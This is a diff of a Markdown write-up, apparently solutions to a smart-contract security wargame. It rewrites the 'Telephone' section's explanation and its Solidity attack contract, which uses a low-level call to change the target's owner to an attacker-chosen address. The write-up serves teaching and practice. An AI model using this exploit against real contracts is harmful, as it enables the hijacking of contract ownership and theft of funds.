@@ -49,20 +49,20 @@ contract AttackCoinFlip {
 ```
 
 ## 4. Telephone
-Don't rely on tx.origin. Remember that when you call a contract (B) function from within another contract (A), the msg.sender is the address of A, not the account that you initiated the function from. The only way you can preserve msg.sender is through DelegateCall but that's another shit show by itself! Would avoid unless you know what you're doing.
+When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from.
 ```
-pragma solidity ^0.4.24;
-import "./telephone.sol";
-
-contract HackIt {
-    Telephone private telephone;
+pragma solidity ^0.6.0;
+contract AttackTelephone {
+    address public telephone;
     
-    constructor(address _address) public {
-        telephone = Telephone(_address);
+    constructor(address _telephone) public {
+        telephone = _telephone;
     }
     
-    function hackIt() public {
-        telephone.changeOwner(msg.sender);
+    function changeBadOwner(address badOwner) public {
+        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", badOwner);
+        (bool success, ) = telephone.call(payload);
+        require(success, "Transaction call using encodeWithSignature is successful");
     }
 }
 ```
